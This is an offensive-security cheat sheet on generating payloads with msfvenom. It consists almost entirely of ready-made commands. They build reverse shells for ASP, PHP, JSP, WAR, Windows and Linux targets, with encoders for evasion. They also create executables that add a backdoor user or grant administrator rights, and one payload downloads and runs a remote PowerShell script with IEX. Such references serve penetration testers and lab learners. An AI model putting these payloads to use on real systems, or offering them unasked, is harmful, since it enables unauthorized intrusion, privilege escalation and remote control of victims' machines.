---
description: Generate payload with MSFvenom
---

# Generate Payload

### Listing

```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
msfvenom -l platforms #Platforms
```

### Web Based Payload

ASP Payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=1337 -f asp > asuka.asp
```

PHP Payload

```bash
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
echo "<?php" | cat - shell.php > temp && mv temp shell.php
```

JSP Payload

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
```

WAR Payload

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
```

### Windows

Create User

```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```

Execute Command

```bash
msfvenom -a x86 --platform Windows \
-p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" \
-f exe > pay.exe
```

```bash
msfvenom -a x86 --platform Windows -p \
windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```

Reverse Shell

* x86

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=1337 -f exe -o Remote.exe
```

* x64

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4443 -f exe -o shell.exe
```

### Linux

* x86

```bash
msfvenom  -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=1337 \
-e x86/shikata_ga_nai -f elf > asuka-x86.elf
```

* x64

```bash
msfvenom -a x64 --platform linux -p linux/x64/shell_reverse_tcp \
LHOST=<IP> LPORT=1337 -e x64/xor_dynamic -f elf > asuka.elf
```

### MSFvenom Payload Creator (MSFPC)

[https://github.com/g0tmi1k/msfpc](https://github.com/g0tmi1k/msfpc)
